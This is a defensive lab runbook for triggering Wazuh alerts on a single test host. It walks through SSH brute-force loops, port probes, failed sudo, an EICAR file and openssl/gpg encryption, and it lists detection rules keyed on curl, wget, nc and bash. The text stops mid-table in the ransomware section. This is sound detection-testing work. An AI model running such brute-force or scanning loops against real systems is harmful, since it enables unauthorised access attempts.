# Lab scenarios — the G2 runbook for `attt-m1-lab` (26–27/09/2026)

Addressed to the person running the lab (the Owner). Every command in this file runs **only** on
`attt-m1-lab` — agent 004, the native Wazuh agent on the ATTT-M1 host itself (DEC-112), enrolled to
`127.0.0.1`. Never on `Windows_Endpoint` (agent 001) and never on the manager container
(`single-node-wazuh.manager-1`, agent 000). This is a runbook, not code: nothing here is executed by
an agent (P6-T05 §11 — "you write the runbook; you do not run a scenario, install a package or touch
the Wazuh manager").

ATTT-M1 is both the lab host **and** the host of the MISP, TheHive, Cortex, Graylog, n8n and
Elasticsearch containers. Their background traffic reaches the same indexer, so heads unrelated to a
scenario fall inside its window; **DEC-114 is why they never become gold truth** — a head is scoped
to a scenario only when its `rule.id` is one of that scenario's declared Expected rules, and every
other in-window head is excluded as `in_window_unexpected` and counted, never labelled.

## 0 · Dates, host state, and the rules of the run

- **26–27/09** — run the scenarios below on `attt-m1-lab`. **28/09** — labelling (two annotators,
  blind) and the gold freeze. The build command is §6, no longer run here.
- **The corpus starts 26/09 00:00 UTC = 07:00 +07:00** (`PULL_START=2026-09-26`, DEC-112). Nothing
  before that reaches `alerts`; **no window opens before 26/09 07:05 +07:00** (§1 check 8).
- **The seconds are the tag.** `attt-m1-lab` shares the estate with the container services above, so
  a lab alert is told from background only by the window you write down. `source='lab'` is applied
  **after the fact, by time window** (`eval/lab_tag.py`, DEC-085), never by agent name. A scenario
  whose start and end seconds are not recorded is lost for G2. That is why every block below carries
  a blank `Start: __:__:__  End: __:__:__` line — filling it in **is** the deliverable.
- **A category with no alert is a zero row, never a synthetic one** (`docs/chot-v3-14-ngay.md` §A2:
  *"nếu không sinh được thì bỏ category đó khỏi bảng kết quả, không giả"*).
- **Nothing is edited in the database by hand.** The only write path is the Wazuh pipeline (real
  traffic → puller → worker) then `eval/lab_tag.py`, which touches `source` only, never `status`.

#### Three rules for how a scenario is run (read before the first window)

1. **Run every scenario from a login terminal, signed in as `user1`; a `sudo` inside it is fine,
   because the login uid survives `sudo` (DEC-113).** Never from `docker exec`, a systemd unit, cron
   or an agent-run command: auditd records execve only for `auid>=1000` and `auid!=unset`
   (`/etc/audit/rules.d/soc-exec.rules`, DEC-113), and those contexts carry no login uid, so
   `100301`/`100302`/`100303` cannot see them.
2. **Inside a window, run only the scenario (DEC-114).** Truth is scoped to the scenario's declared
   Expected rules, but an unrelated command you run inside a `privilege_escalation` window that
   happens to fire `5402` is counted as that scenario's attack. Do nothing else in the window.
3. **Windows never overlap.** `build_gold.py --g2` refuses overlapping windows of the same agent
   with exit 3 (P6-T07). The schedule in §5 spaces every window; keep to it.

#### What is loaded on this manager, measured 25/09 (each fact with its DEC)

1. **The four authored rules are deployed and firing.** `local_rules.xml` in
   `single-node-wazuh.manager-1` is md5 `afd2ef60d7d3418cbdc27c493ad9eccf` (the repo's file), and
   `rule.id:100999` (heartbeat) counts again after five days silent — 10:35:21Z, DEC-113 block 1.
   `100301`/`100302`/`100303` stay at 0 until a scenario fires them (§1 check 2 is the baseline).
2. **Agent 004 `attt-m1-lab` is Active** (`agent_control -l`, DEC-112/113 block 2), version pinned
   `≤ 4.14.7` and held.
3. **ClamAV and auditd are installed and active**, with the `execve` watch narrowed to `auid>=1000`
   (DEC-113 block 3 — this removed a ~123/min MISP-healthcheck storm on `100303`). The agent's own
   `ossec.conf` reads `/var/log/clamav/clamav.log` and `/var/log/audit/audit.log`
   (`docs/plan/prompts/lab-rebuild-run-2026-09-25.md` block 3).
4. **`soc_dev` is a fresh database** (`0|4|7|17` alerts|users|assets|migrations at reset, DEC-118);
   `attt-m1-lab` is in `conf/inventory.yaml` at `criticality: medium`, so auto-close has somewhere
   to fire (DEC-112).

#### History

The 22–24/09 version of this runbook (written for IA1803, before the move) is whole at
`git show pre-lab-reset:docs/lab-scenarios.md`; the 23/09 re-measurement that recorded the move and
the not-yet-deployed state (the `## 0′` block this section replaces) is `413ca19`. DEC-064/068/069's
IA1803 manager, and every `/data/wazuh/logs/...` path they cite, live only in those two references —
not on the box this runbook now runs on.

## 1 · Pre-flight (once, before the first window, and re-checked each morning)

Run from the primary checkout on ATTT-M1. Every `sudo`/`docker` line is the Owner's.

1. **The pipeline is live**, so lab rows reach `alerts` in real time. The worker runs under docker
   compose since the cutover (DEC-105), so check the containers directly, not a host worker process:
   ```bash
   docker compose ps app worker          # both Up
   psql "$DATABASE_URL" -Atc "select last_pull_at, coalesce(last_error,'null') from source_cursor"
   ```
   `last_pull_at` within 2 minutes and `last_error` null.
2. **The four-rule file is loaded** (re-run fresh — a manager restart could have reverted it):
   ```bash
   set -a; . ./.env; set +a
   curl -s --cacert "$INDEXER_CA" -u "$INDEXER_USER:$INDEXER_PASSWORD" "$INDEXER_URL/wazuh-alerts-*/_count" -H 'Content-Type: application/json' -d '{"query":{"term":{"rule.id":"100999"}}}'   # expect count >= 2 (heartbeat, DEC-113)
   curl -s --cacert "$INDEXER_CA" -u "$INDEXER_USER:$INDEXER_PASSWORD" "$INDEXER_URL/wazuh-alerts-*/_count" -H 'Content-Type: application/json' -d '{"query":{"prefix":{"rule.id":"1003"}}}'   # note the count — today's negative-check baseline
   ```
   If the first is `0`, stop — the rules are not live, and no `1003xx` scenario can fire. The deploy
   is the four commands in `docs/wazuh-manager-changes.md` §0′ (`docker cp conf/local_rules.xml
   single-node-wazuh.manager-1:/var/ossec/etc/rules/local_rules.xml` + `chown` + `md5sum` +
   `docker restart`), the Owner's.
3. **Agent 004 is Active** (Owner's command):
   ```bash
   docker exec single-node-wazuh.manager-1 /var/ossec/bin/agent_control -l
   ```
   Expect a line `Name: attt-m1-lab, ... Active`. A `Disconnected` here means the agent is down and
   nothing below will produce an alert.
4. **auditd is watching execve, scoped to login users** (DEC-113 — the scope is what keeps a service
   account's shell out of `100301`–`100303`, and it is why §0 rule 1 requires a login terminal):
   ```bash
   sudo auditctl -l | grep execve
   ```
   Expect **two** lines (b64 and b32), each carrying `-F auid>=1000 -F auid!=-1 -S execve -k exec`.
   If either the count is below 2 or the `auid` filter is missing, `ransomware`/`data_exfiltration`/
   `c2_beacon` will either not fire or will fire on background noise — stop and record it.
5. **ClamAV is present, for `malware`** — installed already (DEC-113 block 3), so this is a check,
   not an install:
   ```bash
   systemctl is-active clamav-daemon clamav-freshclam    # both active
   sudo grep -n 'clamav.log' /var/ossec/etc/ossec.conf   # the agent's <localfile> reads it
   ```
   If the `grep` is empty the agent is not reading ClamAV's log; the two `<localfile>` blocks are in
   `docs/plan/prompts/lab-rebuild-run-2026-09-25.md` block 3. The malware scenario itself is the
   verification: `52502` must appear after the EICAR scan in §3.
6. **sshd accepts password auth on the addresses the schedule uses** (Owner — the effective config
   is root-only; a Coder reading `/etc/ssh/sshd_config*` as `user1` on 25/09 found the main file
   unreadable and the drop-in dir `/etc/ssh/sshd_config.d/` empty, so nothing about the effective
   setting can be asserted from here — run `sshd -T`):
   ```bash
   sudo sshd -T | grep -Ei '^(passwordauthentication|listenaddress|maxauthtries)'
   ```
   `passwordauthentication yes` is needed for the interactive ssh loops in §3. If it is `no`, the
   `ssh_brute_force`/`suspicious_login` scenarios cannot produce a password-prompt failure — record
   it and either enable it for the lab window or skip those two categories (§5's yield table shows
   the cost).
7. **Scratch directory for every file-based scenario:**
   ```bash
   mkdir -p /tmp/lab && printf 'lab plain text\n' > /tmp/lab/plain.txt
   ```
8. **No window opens before 26/09 07:05 +07:00.** `PULL_START=2026-09-26` means 07:00 +07:00 is the
   earliest instant that reaches `alerts` (DEC-112); the five-minute margin covers pull + pipeline
   latency (§2 step 3's 3-minute rule plus slack). A window started earlier tags rows that were
   never ingested.

## 2 · The window protocol — repeat this shape for every scenario in §3

1. **Write the start second**, both forms (local wall clock is what the checklist wants; UTC is
   what the indexer stores):
   ```bash
   date -u +%FT%TZ ; date +%FT%T%z
   ```
2. **Run the command(s)** from the scenario's `#### Attack` or `#### Benign twin` block — and
   nothing else (§0 rule 2).
3. **Wait ≥ 3 minutes** before checking anything — `PULL_INTERVAL_S` is 60 s
   (`backend/app/infra/config.py:118`) and Logstash/filebeat plus the pipeline job need their own
   margin on top of it (`docs/lab-run-log.md` uses the same 3-minute rule).
4. **Write the end second** (same two commands as step 1).
5. **Do not open the next window until this End is written.** Overlapping windows of the same agent
   are refused by `build_gold.py --g2` with exit 3 (P6-T07); the two seconds you just wrote are the
   record that they did not overlap. One window at a time.
6. **The per-window check**, copied from `docs/lab-run-log.md`, read-only, from the primary checkout
   — substitute this run's start/end:
   ```bash
   set -a; . ./.env; set +a
   S="<start, e.g. 2026-09-26T14:00:00+07:00>"; E="<end>"

   # alerts in the window
   curl -s --cacert "$INDEXER_CA" -u "$INDEXER_USER:$INDEXER_PASSWORD" \
     "$INDEXER_URL/wazuh-alerts-*/_count" -H 'Content-Type: application/json' \
     -d "{\"query\":{\"range\":{\"@timestamp\":{\"gte\":\"$S\",\"lte\":\"$E\"}}}}"

   # which rules fired, and from which source ip — by_rule tells the scenario from the host's
   # background; by_srcip proves the schedule's srcip rotation gave a distinct cluster key (§5)
   curl -s --cacert "$INDEXER_CA" -u "$INDEXER_USER:$INDEXER_PASSWORD" \
     "$INDEXER_URL/wazuh-alerts-*/_search?size=0" -H 'Content-Type: application/json' \
     -d "{\"query\":{\"range\":{\"@timestamp\":{\"gte\":\"$S\",\"lte\":\"$E\"}}},
          \"aggs\":{\"by_rule\":{\"terms\":{\"field\":\"rule.id\",\"size\":20}},
                    \"by_srcip\":{\"terms\":{\"field\":\"data.srcip\",\"size\":20}}}}"
   ```
   Each scenario in §3 additionally gives a **rule-scoped** count (its own `#### Attack` /
   `#### Benign twin` block) — that one answers "did *this* rule fire," the block above answers
   "what fired in this window at all," which is what tells noise apart from signal.
7. **Tag the window** — this is what turns "an indexer count" into `source='lab'`:
   ```bash
   PYTHONPATH=backend python3 eval/lab_tag.py \
     --agent attt-m1-lab --since "$S" --until "$E" \
     --scenario <this run's scenario_id from §5> --category <category or "benign"> \
     --kind <attack|benign> --env-file .env
   ```
   A **zero retag is not an error** — it prints `retagged 0 alerts …` and still appends a row; a
   category that produced nothing in a given window is a finding, not a bug (§0).
8. **Fill the checklist row** (§5) — `alerts`, `clusters` (leave blank until `build_gold.py --g2`
   folds the window; `alerts` alone is enough to know the scenario worked), `rules seen` (the
   `by_rule` aggregation from step 6), and check off `lab_tag run?`.

## 3 · Scenarios

Every attack command below is prefixed by §2's window protocol (steps 1–2 wrap the command; steps
5–8 follow it) and every id named as expected is checked against the archive in §0's "not in the
archive" sense. Every section ends with the label an analyst should reach — stated as the runbook's
own expectation, **not** shown to the labellers; the labelling page is blind and this file is not on
it.

**The source address — `$SRC` — and why it rotates.** A cluster key is
`(rule_id, srcip, dstip, agent_name)`. Measured 25/09, `ip route show table local` gives
`local 127.0.0.0/8 dev lo … src 127.0.0.1`, so without an explicit bind **every loopback connection
reports `srcip = 127.0.0.1`**, whatever the destination — so two same-category ssh windows to
`127.0.0.1` would share a key and the second would dedup into the first (`IDLE_GAP` 15 min). The
ssh-based scenarios (`ssh_brute_force`, `suspicious_login`, `recon`) therefore bind their source
with `ssh -b "$SRC"`, taking `$SRC` from the schedule's `srcip` column (§5): the loopback aliases
`127.0.0.1`, `127.0.0.2`, `127.0.0.3` (all already routable on `lo`, no setup). **Fallback, measured
if needed:** if the first `SBF` window's `by_srcip` aggregation (§2 step 6) still shows only
`127.0.0.1` — some sshd builds log the peer of the accepted socket, not the bound source — switch
`$SRC` to the host's own LAN addresses `79.79.79.14` (`enp86s0`) or `79.79.78.119` (`wlo1`, Wi-Fi,
DHCP — re-read with `ip -4 addr` before using), where the kernel records that address as the source.
The local-rule scenarios (`ransomware`, `data_exfiltration`, `c2_beacon`) and `malware` are execve-
or ClamAV-driven, not network-source-driven, so they rely on the ≥ 20-minute spacing in §5 instead
of `srcip`. Set it once per window before the command: `SRC=127.0.0.2   # from §5's srcip column`.

### ssh_brute_force

> Playbook: `ssh_brute_force_v1`. Live today — stock rules only, no local content needed.

#### Attack

```bash
for i in $(seq 1 8); do
  ssh -b "$SRC" -o PreferredAuthentications=password -o PubkeyAuthentication=no \
      -o StrictHostKeyChecking=no -o NumberOfPasswordPrompts=1 -o ConnectTimeout=5 \
      user1@127.0.0.1 true
  # type any wrong string at the password prompt, Enter, and move to the next iteration —
  # this loop is interactive by design (no sshpass, per the card; §1 item 7 explains why
  # this runbook does not use paramiko either)
done
```

Run all 8 inside **2 minutes** — the frequency rule below needs the burst, not just the count.

**Expected rule:** each failed attempt fires **one** of `5503` (PAM decoder path) or `5760`/`5710`
(sshd decoder path) — resolves `ssh_brute_force` either way via `T1110.001` (tier 1, exact MITRE
match), so which literal id this host emits does not change the category; the per-window `by_rule`
breakdown (§2 step 6) shows which one. **Not** `40112` ("multiple failures followed by a success")
— this scenario deliberately never succeeds, so `40112`'s own precondition never fires.

**Indexer check** (rule-scoped; run alongside §2 step 6):
```bash
curl -s --cacert "$INDEXER_CA" -u "$INDEXER_USER:$INDEXER_PASSWORD" \
  "$INDEXER_URL/wazuh-alerts-*/_count" -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"terms\":{\"rule.id\":[\"5503\",\"5760\",\"5710\"]}},{\"range\":{\"@timestamp\":{\"gte\":\"$S\",\"lte\":\"$E\"}}}]}}}"
```

**Start:** `__:__:__` (+07:00)   **End:** `__:__:__` (+07:00)

**Tag it (§2 step 7):** `PYTHONPATH=backend python3 eval/lab_tag.py --agent attt-m1-lab --since "$S" --until "$E" --scenario SBF-A<n> --category ssh_brute_force --kind attack --env-file .env`

**The loopback caveat.** `srcip = 127.0.0.1` is exactly what DEC-053 excludes from **G1** (67
loopback `ssh_brute_force` clusters, 662 alerts, dropped from the fold's pool). For **G2** it is
the lab and it is kept — this scenario has no other source address to use, and the exclusion is a
G1-only rule (`docs/plan/DECISIONS.md` DEC-053).

#### Expected rules

| id | description (as seen in the archive) | resolves to | verified how |
|---|---|---|---|
| `5710` | "sshd: Attempt to login using a non-existent user" | `ssh_brute_force` (mitre, `T1110.001`) | archive: 35,796 hits, `grep -m1 '"id":"5710"' /home/user1/archive/alerts-2026-08-08_09-07.jsonl`; resolver: `resolve(["T1110.001"],["syslog","sshd","authentication_failed","invalid_login"],"sshd",0).category == "ssh_brute_force"` |
| `5760` | "sshd: authentication failed." | `ssh_brute_force` (mitre, `T1110.001`) | archive: 1,190 hits |
| `5503` | "PAM: User login failed." | `ssh_brute_force` (mitre, `T1110.001`) | archive: 11,774 hits — this is also the fixture `backend/tests/fixtures/archive_line_5503.json` |
| `2501` | "syslog: User authentication failure." | `ssh_brute_force` (rule_groups, `authentication_failed` — no `rule.mitre` block on this one, so it resolves at tier 3) | archive: 10,411 hits; INBOX `2026-09-08 · P6 / G2` names it as one of `ssh_brute_force`'s stock ids |
| `5712` | "sshd: brute force trying to get access to the system. Non existent user." | `ssh_brute_force` (mitre, `T1110` exact) | archive: 46 hits — named only because it appears (design note 3's rule) |

The description text on `5710`/`5712` says "non-existent user" even though `user1` is a real
account; the archive's own 35,796 hits for `5710` show it is this host's dominant sshd-failure rule
regardless, and this runbook does not re-derive Wazuh's own rule text beyond what is measured.

**Expected label:** `escalate`.

#### Benign twin

A single mistyped password, corrected on the next try — the shape of a person, not a script:

```bash
ssh -b "$SRC" -o PreferredAuthentications=password -o PubkeyAuthentication=no \
    -o StrictHostKeyChecking=no -o NumberOfPasswordPrompts=1 -o ConnectTimeout=5 \
    user1@127.0.0.1 true    # type the WRONG password once
ssh -b "$SRC" -o PreferredAuthentications=password -o PubkeyAuthentication=no \
    -o StrictHostKeyChecking=no -o NumberOfPasswordPrompts=3 -o ConnectTimeout=5 \
    user1@127.0.0.1 true    # type the RIGHT password
```

**Expected rule:** one `5503`/`5710`/`5760` (the single failure) followed by `5715`/`5501` (the
success) — one or two events total, nowhere near the ≥8-in-2-minutes shape the frequency rule
needs, so `5712` does not fire.

**Indexer check:**
```bash
curl -s --cacert "$INDEXER_CA" -u "$INDEXER_USER:$INDEXER_PASSWORD" \
  "$INDEXER_URL/wazuh-alerts-*/_count" -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"rule.id\":\"5712\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$S\",\"lte\":\"$E\"}}}]}}}"
```
Expected: `0` — the negative half of this twin is that the frequency rule stays silent.

**Start:** `__:__:__` (+07:00)   **End:** `__:__:__` (+07:00)

**Expected label:** `benign`.

---

### suspicious_login

> Playbook: `suspicious_login_v1`. Live today — stock rules only.

#### Attack

A success immediately after a failure burst — the "attack flavour" the card names, and honesty
about where it actually resolves:

```bash
for i in $(seq 1 8); do
  ssh -b "$SRC" -o PreferredAuthentications=password -o PubkeyAuthentication=no \
      -o StrictHostKeyChecking=no -o NumberOfPasswordPrompts=1 -o ConnectTimeout=5 \
      user1@127.0.0.1 true    # wrong password, x8
done
ssh -b "$SRC" -o PreferredAuthentications=password -o PubkeyAuthentication=no \
    -o StrictHostKeyChecking=no -o NumberOfPasswordPrompts=3 -o ConnectTimeout=5 \
    user1@127.0.0.1 true      # right password
```

**Why 8, not 3 (found by running it, not by reading the rule):** `40112`'s own condition is
`<if_matched_group>authentication_failures</if_matched_group>` — the *plural* group, which only
`5712`/`5763` (the brute-force **correlation** rules) carry. A lone failure (`5710`/`5716`/`5760`/
`5503`) only carries the singular `authentication_failed` and does not satisfy `40112` no matter how
many of them precede the success. `5763` itself needs `frequency="8"` within `timeframe="120"` to
fire — so the success has to land within `5763`'s own `timeframe="240"` window *after* a burst that
already crossed 8, not after 3. Verified live on this host: 3 failures + success produced `5760`/
`5503`/`5715` but no `5712`/`5763`/`40112`; 8 failures + success produced `5763` then `40112`.

**Expected rule:** `40112` "Multiple authentication failures followed by a success," level 12 —
**this resolves `ssh_brute_force`, not `suspicious_login`**, because its MITRE block carries both
`T1078` and `T1110` and `ssh_brute_force` outranks `suspicious_login` in `category.PRIORITY`
(`backend/app/ingest/category.py`'s tier-1 exact match collects both ids and sorts by priority —
context pack §8 names this exact case). Stated plainly: **`suspicious_login`'s own live clusters on
this host are benign-shaped** — a plain successful login is the only thing that resolves there —
and this scenario exists to show that honestly rather than paper over it with an invented
"suspicious" flavour category.py cannot produce.

**Indexer check:**
```bash
curl -s --cacert "$INDEXER_CA" -u "$INDEXER_USER:$INDEXER_PASSWORD" \
  "$INDEXER_URL/wazuh-alerts-*/_count" -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"rule.id\":\"40112\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$S\",\"lte\":\"$E\"}}}]}}}"
```

**Start:** `__:__:__` (+07:00)   **End:** `__:__:__` (+07:00)

**Tag it (§2 step 7):** `PYTHONPATH=backend python3 eval/lab_tag.py --agent attt-m1-lab --since "$S" --until "$E" --scenario SL-A<n> --category suspicious_login --kind attack --env-file .env`

#### Expected rules

| id | description (as seen) | resolves to | verified how |
|---|---|---|---|
| `5715` | "sshd: authentication success." | `suspicious_login` (mitre, `T1078`) | archive: 124 hits |
| `5501` | "PAM: Login session opened." | `suspicious_login` (mitre, `T1078`) | archive: 923 hits |
| `40112` | "Multiple authentication failures followed by a success." | `ssh_brute_force` — **not** `suspicious_login` (mitre, `T1110` outranks `T1078`) | archive: 6 hits; resolver: `resolve(["T1078","T1110"],["syslog","attacks"],"sshd",0).category == "ssh_brute_force"` |

**Expected label:** `escalate` for the attack command above (level 12, `40112`) — while noting for
the labeller-facing evaluation chapter that the category it lands in is `ssh_brute_force`, not
`suspicious_login`.

#### Benign twin

The plain admin login this category's own clusters actually look like:

```bash
ssh -b "$SRC" -o PreferredAuthentications=password -o PubkeyAuthentication=no \
    -o StrictHostKeyChecking=no -o NumberOfPasswordPrompts=3 -o ConnectTimeout=5 \
    user1@127.0.0.1 true    # right password, first try
```

**Expected rule:** `5715`/`5501` only — no prior failures, so `40112` cannot fire.

**Start:** `__:__:__` (+07:00)   **End:** `__:__:__` (+07:00)

**Expected label:** `benign`.

---

### privilege_escalation

> Playbook: `privilege_escalation_v1`. Live today via stock `sudo`/`rootcheck` rules.

#### Attack

```bash
sudo -k
sudo -S true <<< 'definitely-the-wrong-password'   # failed sudo
su - root -c true <<< 'also-wrong'                 # failed su, for the attack flavour
```

**Expected rule:** `5401` "Failed attempt to run sudo" (mitre_parent, `T1548.003` → `T1548`) for
the first line. The `su` failure is run and logged for completeness, but **no distinct rule id for
it survives in the 30-day archive** — a search for `pam_unix(su` in the archive finds only
successful-session lines (`5501`/`5502`); a PAM `su` failure would fall through the same generic
`authentication_failed` group path as an SSH failure, and this runbook does not invent an id for a
line the archive never shows. Treat any id the Owner actually observes here as a bonus fact for
`docs/gold-v1-report.md`, not a defined check.

**Indexer check:**
```bash
curl -s --cacert "$INDEXER_CA" -u "$INDEXER_USER:$INDEXER_PASSWORD" \
  "$INDEXER_URL/wazuh-alerts-*/_count" -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"rule.id\":\"5401\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$S\",\"lte\":\"$E\"}}}]}}}"
```

**Start:** `__:__:__` (+07:00)   **End:** `__:__:__` (+07:00)

**Tag it (§2 step 7):** `PYTHONPATH=backend python3 eval/lab_tag.py --agent attt-m1-lab --since "$S" --until "$E" --scenario PE-A<n> --category privilege_escalation --kind attack --env-file .env`

**Rootcheck note:** `510`/`521` fire on the rootcheck schedule, not on demand — do not wait for
them inside this window; if the schedule happens to land during the lab days, the per-window
`by_rule` breakdown (§2 step 6) will show it as host noise, not as this scenario's evidence.

#### Expected rules

| id | description (as seen) | resolves to | verified how |
|---|---|---|---|
| `5402` | "Successful sudo to ROOT executed." | `privilege_escalation` (mitre_parent, `T1548.003` → `T1548`) | archive: 704 hits |
| `5401` | "Failed attempt to run sudo." | `privilege_escalation` (mitre_parent, `T1548.003` → `T1548`) | archive: 6 hits |
| `510` | "Host-based anomaly detection event (rootcheck)." | `privilege_escalation` (rule_groups, `rootcheck` — no `rule.mitre` block) | archive: 12 hits |
| `521` | "Possible kernel level rootkit" | `privilege_escalation` (rule_groups, `rootcheck`) | archive: 13 hits |

`5402`'s own level is 3 (routine administration) — DEC-055's "named, not fixed" case: whether a
successful, unremarkable `sudo` is itself worth an analyst's time is left to the labellers, not
decided here.

**Expected label:** `escalate` for the failed-sudo/failed-`su` attack; `benign` for the successful
sudo below.

#### Benign twin

```bash
sudo -k && sudo true    # correct password — routine administration
```

**Expected rule:** `5402` only, level 3.

**Start:** `__:__:__` (+07:00)   **End:** `__:__:__` (+07:00)

---

### recon

> Playbook: `recon_v1`. Live today — **nmap is not installed and not needed** (INBOX `2026-09-08 ·
> P6 / G2`).

#### Attack

```bash
for i in $(seq 1 6); do
  nc -s "$SRC" -z -w1 127.0.0.1 22
done
# or, if nc is unavailable:
ssh-keyscan -T2 127.0.0.1 ; ssh-keyscan -T2 127.0.0.1 ; ssh-keyscan -T2 127.0.0.1
```

Six probes inside a couple of minutes — the same repetition principle as `ssh_brute_force`, aimed
at a scan-detection threshold instead of an authentication one.

**Expected rule:** `5731` "SSH Scanning" and/or `40601` "Network scan from same source ip" once the
probe count crosses the manager's threshold; `5706` "insecure connection attempt (scan)" may also
fire per-probe. **Not** `5710`/`5760` — those need an actual authentication attempt (a username and
a password prompt), and `nc -z` / `ssh-keyscan` never send one. **Thin premise, stated honestly:**
`40601` is typically a correlation over *multiple distinct ports or hosts*; six probes at one port
on one host may not cross its threshold even though `5731` does — that is expected, not a scenario
failure, and the per-window `by_rule` breakdown will show exactly which of the three actually fired.

**Indexer check:**
```bash
curl -s --cacert "$INDEXER_CA" -u "$INDEXER_USER:$INDEXER_PASSWORD" \
  "$INDEXER_URL/wazuh-alerts-*/_count" -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"terms\":{\"rule.id\":[\"5706\",\"5731\",\"40601\"]}},{\"range\":{\"@timestamp\":{\"gte\":\"$S\",\"lte\":\"$E\"}}}]}}}"
```

**Start:** `__:__:__` (+07:00)   **End:** `__:__:__` (+07:00)

**Tag it (§2 step 7):** `PYTHONPATH=backend python3 eval/lab_tag.py --agent attt-m1-lab --since "$S" --until "$E" --scenario RC-A<n> --category recon --kind attack --env-file .env`

#### Expected rules

| id | description | resolves to | verified how |
|---|---|---|---|
| `5706` | "insecure connection attempt (scan)" (INBOX `2026-09-08 · P6 / G2`) | `recon` (expected via `T1046` / groups `recon`/`web_scan`/`nmap`) | **not in the archive — expected from the ruleset, unverified here** (0 hits; the stock ruleset was read directly on the manager on 08/09 via `sg wazuh`, not from this archive) |
| `5731` | "SSH Scanning" | `recon` (mitre, `T1046`) | **not in the archive — expected from the ruleset, unverified here** (0 hits) |
| `40601` | "Network scan from same source ip" | `recon` | **not in the archive — expected from the ruleset, unverified here** (0 hits) |

Table-verified regardless of archive presence: `resolve(["T1046"], [], None, 0).category ==
"recon"` and `resolve([], ["recon"], None, 0).category == "recon"` both hold against
`backend/app/ingest/category.py` as shipped.

**Expected label:** `escalate` for the repeated probe; `benign` for the single self-scan below.

#### Benign twin

```bash
ssh-keyscan -T2 127.0.0.1    # a single self scan
```

May still register one `5706` (a single probe is still a probe) — the point is that it does not
cross the repetition threshold `5731`/`40601` need, not that it is silent.

**Start:** `__:__:__` (+07:00)   **End:** `__:__:__` (+07:00)

---

### malware

> Playbook: `malware_v1`. Needs the Owner's `apt install clamav clamav-daemon` (§1 item 4).

#### Attack

```bash
{ printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$'; printf 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\n'; } > /tmp/lab/eicar.com
clamdscan /tmp/lab/eicar.com
```

(Split across two `printf` calls, per the card, so this runbook file itself is never flagged by a
scanner reading it.)

**Expected rule:** `52502` "ClamAV: Virus detected" — not `80712` "Auditd: execution of a file
ended abnormally" (INBOX `2026-09-08 · P6 / G2` names `80712` as a semantically weak alternate that
carries `T1204` on *any* abnormal exit; `clamdscan` exiting because it found a virus is not an
abnormal exit, so `80712` is not expected here).

**Indexer check:**
```bash
curl -s --cacert "$INDEXER_CA" -u "$INDEXER_USER:$INDEXER_PASSWORD" \
  "$INDEXER_URL/wazuh-alerts-*/_count" -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"rule.id\":\"52502\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$S\",\"lte\":\"$E\"}}}]}}}"
```

**Start:** `__:__:__` (+07:00)   **End:** `__:__:__` (+07:00)

**Tag it (§2 step 7):** `PYTHONPATH=backend python3 eval/lab_tag.py --agent attt-m1-lab --since "$S" --until "$E" --scenario MW-A<n> --category malware --kind attack --env-file .env`

#### Expected rules

| id | description | resolves to | verified how |
|---|---|---|---|
| `52502` | "ClamAV: Virus detected" (group `virus`, decoder `0075-clamav`) | `malware` (rule_groups `virus`, or decoder `clamd` — both map to `malware`) | **not in the archive — expected from the ruleset, unverified here** (0 hits; ClamAV was never installed during the archived 30 days). Table-verified: `resolve([], ["virus"], None, 0).category == "malware"` and `resolve([], [], "clamd", 0).category == "malware"` both hold. |

**Expected label:** `escalate` for the EICAR hit; `benign` for the clean scan below.

#### Benign twin

```bash
clamdscan /tmp/lab/plain.txt    # clean file — no virus signature
freshclam                        # signature update; record which rule, if any, fires
```

**Expected rule:** none from `clamdscan` (a clean result produces no `52502`); `freshclam`'s own
rule id, if any, is recorded in the checklist notes rather than predicted here — it was never
installed during the archived window either.

**Start:** `__:__:__` (+07:00)   **End:** `__:__:__` (+07:00)

---

### ransomware

> Local rule `100301`. Playbook: `ransomware_v1`. Reachable only through the local rule authored under DEC-056 route B —
> **DEC-056 amendment 3 applies**: the detection logic was written by the operator whose system is
> being evaluated. Named here, not buried in a footnote (§7 carries the full sentence).

#### Attack

```bash
openssl enc -aes-256-cbc -salt -in /tmp/lab/plain.txt -out /tmp/lab/plain.txt.enc -k labpass
gpg --batch --symmetric --passphrase labpass /tmp/lab/plain.txt
```

**Expected rule:** `100301` — satisfies `conf/local_rules.xml`'s own `<match type="pcre2">` on
`audit.exe` ending in `openssl`/`gpg`/`gpg2`:
`a\d+="enc".*a\d+="-(?:k|pass|kfile)"|a\d+="(?:-c|--symmetric)".*a\d+="--(?:batch|passphrase|passphrase-fd|passphrase-file)"`
— the `openssl` line matches the first alternative (`enc` + `-k`), the `gpg` line matches the
second (`--symmetric` + `--passphrase`). **Not** `100302`/`100303` — neither command's `audit.exe`
matches `curl`/`wget`/`nc`/`bash`, so the other two local rules' `<field name="audit.exe">` never
even reaches their `<match>`.

**Indexer check:**
```bash
curl -s --cacert "$INDEXER_CA" -u "$INDEXER_USER:$INDEXER_PASSWORD" \
  "$INDEXER_URL/wazuh-alerts-*/_count" -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"rule.id\":\"100301\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$S\",\"lte\":\"$E\"}}}]}}}"
```

**Start:** `__:__:__` (+07:00)   **End:** `__:__:__` (+07:00)

**Tag it (§2 step 7):** `PYTHONPATH=backend python3 eval/lab_tag.py --agent attt-m1-lab --since "$S" --until "$E" --scenario RW-A<n> --category ransomware --kind attack --env-file .env`

#### Expected rules

| id | description (as authored) | resolves to | verified how |
|---|---|---|---|
